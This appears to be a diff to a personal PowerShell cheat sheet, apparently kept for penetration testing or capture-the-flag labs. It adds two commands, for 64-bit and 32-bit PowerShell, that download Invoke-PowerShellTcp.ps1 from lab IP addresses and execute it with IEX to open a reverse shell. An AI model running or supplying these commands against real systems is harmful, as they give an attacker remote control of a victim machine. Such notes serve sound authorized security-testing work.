@@ -43,6 +43,17 @@ $PSVersionTable
 - `Get-Help remoting`
 - `Get-Help about_*remot*`
 
+
+
+64 bit
+```
+%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.Webclient).DownloadString('http://10.10.14.17/Invoke-PowerShellTcp.ps1')"
+```
+32 bit
+```
+START /MIN /LOW CMD /C %SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe "IEX(New-Object Net.Webclient).DownloadString('http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1')"
+```
+
 ## Basic Constructs
 
 ```
